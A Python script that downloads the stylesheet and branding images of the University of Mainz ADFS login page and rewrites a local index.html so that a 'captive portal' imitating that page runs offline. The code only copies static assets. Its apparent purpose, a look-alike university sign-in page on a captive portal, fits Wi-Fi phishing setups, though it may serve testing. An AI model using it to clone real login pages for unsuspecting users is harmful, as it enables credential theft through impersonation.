#!/usr/bin/env python3
"""
Download external resources for the captive portal
This script downloads CSS and images from the real UNI-MAINZ server
and saves them locally so the captive portal works offline
"""

import requests
import os
import re

# Base URL
BASE_URL = "https://login.uni-mainz.de"

# Resources to download
RESOURCES = {
    'css/style.css': '/adfs/portal/css/style.css?id=26CEECBE647EF7ACA381009BB3CF2F032EEADC53BBB43F89F64DC261F1124717',
    'images/illustration.png': '/adfs/portal/illustration/illustration.png?id=6F3C65EF5615D6F0246C7044E94ACE44FD9213A094B2C7BA701F733D1550D3BC',
    'images/logo.png': '/adfs/portal/logo/logo.png?id=F7B50A47667D7645693BC41BDBEBF8EB500223E44756E685F7F08ADB1D1898DB',
    'images/localsts.png': '/adfs/portal/images/idp/localsts.png?id=813E4C443F9CC910A75A0A34D88125C8D8BB17EC310BFC99768CB28F1A066C5E',
    'images/idp.png': '/adfs/portal/images/idp/idp.png?id=BA97FED77919F4CEF84BEE47CFAFA5E1236B77099F25320730C09B7B6CA21F3C',
}

def download_resource(url, output_path):
    """Download a resource from URL and save to output_path"""
    try:
        print(f"Downloading {url}...")
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        
        # Save the file
        with open(output_path, 'wb') as f:
            f.write(response.content)
        
        print(f"  ✓ Saved to {output_path}")
        return True
    except Exception as e:
        print(f"  ✗ Error: {e}")
        return False

def update_html():
    """Update index.html to use local resources"""
    html_file = 'index.html'
    
    if not os.path.exists(html_file):
        print(f"Error: {html_file} not found!")
        return False
    
    print(f"\nUpdating {html_file}...")
    
    with open(html_file, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Replace external CSS link with local
    content = re.sub(
        r'href="https://login\.uni-mainz\.de/adfs/portal/css/style\.css[^"]*"',
        'href="/css/style.css"',
        content
    )
    
    # Replace illustration background image
    content = re.sub(
        r'url\(https://login\.uni-mainz\.de/adfs/portal/illustration/illustration\.png[^)]*\)',
        'url(/images/illustration.png)',
        content
    )
    
    # Replace logo image
    content = re.sub(
        r'src=[\'"]https://login\.uni-mainz\.de/adfs/portal/logo/logo\.png[^\'\"]*[\'"]',
        'src="/images/logo.png"',
        content
    )
    
    # Replace localsts.png
    content = re.sub(
        r'src=[\'"]https://login\.uni-mainz\.de/adfs/portal/images/idp/localsts\.png[^\'\"]*[\'"]',
        'src="/images/localsts.png"',
        content
    )
    
    # Replace idp.png
    content = re.sub(
        r'src=[\'"]https://login\.uni-mainz\.de/adfs/portal/images/idp/idp\.png[^\'\"]*[\'"]',
        'src="/images/idp.png"',
        content
    )
    
    # Save updated HTML
    with open(html_file, 'w', encoding='utf-8') as f:
        f.write(content)
    
    print(f"  ✓ Updated {html_file}")
    return True

def main():
    print("=" * 60)
    print("UNI-MAINZ Captive Portal - Resource Downloader")
    print("=" * 60)
    print()
    
    # Download all resources
    success_count = 0
    for local_path, remote_path in RESOURCES.items():
        url = BASE_URL + remote_path
        if download_resource(url, local_path):
            success_count += 1
    
    print()
    print(f"Downloaded {success_count}/{len(RESOURCES)} resources")
    
    # Update HTML file
    if update_html():
        print()
        print("✓ All done! The captive portal is now self-contained.")
        print("  External resources have been downloaded and HTML updated.")
    else:
        print()
        print("✗ Failed to update HTML file")
        return 1
    
    return 0

if __name__ == '__main__':
    exit(main())
